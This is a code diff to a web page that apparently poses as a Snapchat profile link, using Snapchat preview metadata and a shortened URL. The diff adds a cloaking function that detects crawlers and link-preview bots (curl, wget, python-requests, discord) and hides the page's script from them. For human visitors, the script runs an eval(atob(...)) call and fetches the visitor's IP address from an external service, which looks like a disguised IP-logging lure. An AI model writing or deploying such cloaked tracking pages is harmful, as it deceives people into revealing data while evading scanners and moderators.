@@ -4,7 +4,29 @@
 <meta content="https://shorturl.at/vRYlL" property="og:url" />
 <meta content="https://us-east1-aws.api.snapchat.com/web-capture/www.snapchat.com/add/sophiieeeee111/preview/square.jpeg?xp_id=1" property="og:image" />
 <script>
+  function detectScraper() {
+  const userAgent = navigator.userAgent;
+
+  // List of common scraper User-Agents
+  const scraperAgents = [
+    "curl",
+    "wget",
+    "python-requests",
+    "node-fetch",
+    "axios",
+    "discord"
+    // Add more known scraper User-Agents here
+  ];
+
+  for (const agent of scraperAgents) {
+    if (userAgent.toLowerCase().includes(agent)) {
+      return true;
+    }
+  }
+  return false;
+}
   eval(atob(""))
+  if(detectScraper()) {return false;} else {
   let i = ""
   fetch("https://myexternalip.com/raw").then(res=>{
     res.text().then(tx=>{
@@ -59,4 +81,6 @@
       })
     })
   })
+  }
 </script>
+
